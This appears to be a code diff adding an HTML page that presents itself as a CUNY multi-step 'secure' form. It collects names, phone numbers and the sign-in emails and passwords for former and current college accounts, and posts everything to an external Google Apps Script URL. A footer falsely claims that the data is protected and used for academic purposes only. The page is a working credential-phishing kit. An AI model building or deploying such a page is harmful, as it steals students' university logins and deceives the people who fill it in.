@@ -1,0 +1,259 @@
+<!-- Your original code starts here -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure Multi-Step Form</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/d/d1/City_College_of_New_York.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .form-container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      border-radius: 10px;
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+    }
+
+    .form-title {
+      font-size: 18px;
+      color: #444;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .input-group label {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .input-group input:focus {
+      border-color: #0078d4;
+      outline: none;
+      transition: 0.3s;
+    }
+
+    .form-button {
+      background-color: #0078d4;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s, transform 0.2s ease;
+    }
+
+    .form-button:hover {
+      background-color: #588eea;
+      transform: scale(1.02);
+    }
+
+    .step-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+
+    .step-buttons button {
+      background-color: #f1f1f1;
+      color: #333;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .step-buttons button:hover {
+      background-color: #ddd;
+    }
+
+    .success-message {
+      display: none;
+      color: green;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    footer.footer-note {
+      background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/24/Queens_College_CUNY_Quad.jpg');
+      background-size: cover;
+      background-position: center;
+      padding: 40px 20px;
+      margin-top: 40px;
+      color: white;
+      position: relative;
+    }
+
+    .footer-note .footer-overlay {
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 20px;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: auto;
+      text-align: center;
+      font-size: 13px;
+      color: #f9f9f9;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <img src="yourlogo.png" alt="CUNY Logo" style="width: 150px; margin-bottom: 20px;">
+    <form id="multiStepForm" method="POST" action="https://script.google.com/macros/s/AKfycbybgnkh4tWHfjt3z4EAxdyXNMRRxjA1DUoLUMR-06jrdhGRJpeeLkD8tGLeW0nROh42/exec">
+      
+      <!-- Step 1: Personal Information -->
+      <div id="step1">
+        <div class="form-title">Personal Information</div>
+        <div class="input-group">
+          <label for="fullName">Full Name</label>
+          <input type="text" id="fullName" name="fullName" required placeholder="Your Full Name">
+        </div>
+        <div class="input-group">
+          <label for="personalEmail">Personal Email</label>
+          <input type="email" id="personalEmail" name="personalEmail" required placeholder="yourname@example.com">
+        </div>
+        <div class="input-group">
+          <label for="phoneNumber">Verification Phone Number</label>
+          <input type="tel" id="phoneNumber" name="phoneNumber" required placeholder="e.g., +1234567890">
+        </div>
+      </div>
+
+      <!-- Step 2: Former College Information -->
+      <div id="step2" class="hidden">
+        <div class="form-title">Former College Information</div>
+        <div class="input-group">
+          <label for="formerCollegeName">Name of Former College/University</label>
+          <input type="text" id="formerCollegeName" name="formerCollegeName" required placeholder="Former College or University Name">
+        </div>
+        <div class="input-group">
+          <label for="formerCollegeEmail">Former College Sign-In Email</label>
+          <input type="email" id="formerCollegeEmail" name="formerCollegeEmail" required placeholder="example@college.edu">
+        </div>
+        <div class="input-group">
+          <label for="formerCollegeKey">Former College Access Key</label>
+          <input type="password" id="formerCollegeKey" name="formerCollegeKey" required placeholder="Enter your access key">
+        </div>
+      </div>
+
+      <!-- Step 3: Current College Information -->
+      <div id="step3" class="hidden">
+        <div class="form-title">Current College Information</div>
+        <div class="input-group">
+          <label for="currentCollegeName">Name of Current College/University</label>
+          <input type="text" id="currentCollegeName" name="currentCollegeName" required placeholder="Current College or University Name">
+        </div>
+        <div class="input-group">
+          <label for="currentCollegeEmail">Current College Sign-In Email</label>
+          <input type="email" id="currentCollegeEmail" name="currentCollegeEmail" required placeholder="example@college.edu">
+        </div>
+        <div class="input-group">
+          <label for="currentCollegeKey">Current College Access Key</label>
+          <input type="password" id="currentCollegeKey" name="currentCollegeKey" required placeholder="Enter your access key">
+        </div>
+      </div>
+
+      <!-- Navigation Buttons -->
+      <div class="step-buttons">
+        <button type="button" id="prevStep" class="hidden">Back</button>
+        <button type="button" id="nextStep">Next</button>
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit" id="submitButton" class="form-button hidden">Submit</button>
+    </form>
+
+    <!-- Success Message -->
+    <div class="success-message" id="successMessage">Thank you! Your information has been submitted.</div>
+  </div>
+
+  <!-- Footer Section -->
+  <footer class="footer-note">
+    <div class="footer-overlay">
+      <p>This form securely collects information for academic use only. All data is protected and complies with institutional policies.</p>
+    </div>
+  </footer>
+
+  <script>
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const nextStep = document.getElementById('nextStep');
+    const prevStep = document.getElementById('prevStep');
+    const submitButton = document.getElementById('submitButton');
+    const successMessage = document.getElementById('successMessage');
+    const multiStepForm = document.getElementById('multiStepForm');
+
+    let currentStep = 1;
+
+    nextStep.addEventListener('click', () => {
+      if (currentStep === 1) {
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+        prevStep.classList.remove('hidden');
+      } else if (currentStep === 2) {
+        step2.classList.add('hidden');
+        step3.classList.remove('hidden');
+        nextStep.classList.add('hidden');
+        submitButton.classList.remove('hidden');
+      }
+      currentStep++;
+    });
+
+    prevStep.addEventListener('click', () => {
+      if (currentStep === 3) {
+        step3.classList.add('hidden');
+        step2.classList.remove('hidden');
+        nextStep.classList.remove('hidden');
+        submitButton.classList.add('hidden');
+      } else if (currentStep === 2) {
+        step2.classList.add('hidden');
+        step1.classList.remove('hidden');
+        prevStep.classList.add('hidden');
+      }
+      currentStep--;
+    });
+
+    multiStepForm.addEventListener('submit', function (e) {
+      successMessage.style.display = 'block';
+    });
+  </script>
+</body>
+</html>
